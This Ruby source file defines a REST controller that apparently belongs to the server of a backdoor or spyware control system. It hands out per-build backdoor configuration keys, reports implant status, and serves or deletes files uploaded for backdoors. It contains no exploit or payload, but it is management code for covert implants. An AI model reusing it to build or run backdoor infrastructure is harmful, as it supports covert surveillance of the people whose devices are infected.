#
# Controller for the Backdoor objects
#

module RCS
module DB

class BackdoorController < RESTController

  # retrieve the class key of the backdoors
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def class_keys
    require_auth_level :server

    classes = {}

    if params[:backdoor] then
      DB.backdoor_class_key(params[:backdoor]).each do |entry|
          classes[entry[:build]] = entry[:confkey]
        end
    else
      DB.backdoor_class_keys.each do |entry|
          classes[entry[:build]] = entry[:confkey]
        end
    end

    return STATUS_OK, *json_reply(classes)
  end

  # retrieve the status of a backdoor instance.
  def status
    require_auth_level :server
    
    request = JSON.parse(params[:backdoor])

    status = DB.backdoor_status(request['build_id'], request['instance_id'], request['subtype'])

    # if it does not exist
    status ||= {}
    
    #TODO: all the backdoor.identify stuff...
    # if the backdoor does not exist, 

    return STATUS_OK, *json_reply(status)
  end


  # retrieve the list of upload for a given backdoor
  def uploads
    require_auth_level :server, :tech

    list = DB.backdoor_uploads(params[:backdoor])

    return STATUS_OK, *json_reply(list)
  end

  # retrieve or delete a single upload entity
  def upload
    require_auth_level :server, :tech

    request = JSON.parse(params[:backdoor])

    case @req_method
      when 'GET'
        upload = DB.backdoor_upload(request['backdoor_id'], request['upload_id'])
        trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{upload[:content].size.to_s_bytes}"
        return STATUS_OK, upload[:content], "binary/octet-stream"
      when 'DELETE'
        DB.backdoor_del_upload(request['backdoor_id'], request['upload_id'])
        trace :info, "[#{@req_peer}] Deleted the UPLOAD #{request}"
    end

    return STATUS_OK
  end

end

end #DB::
end #RCS::
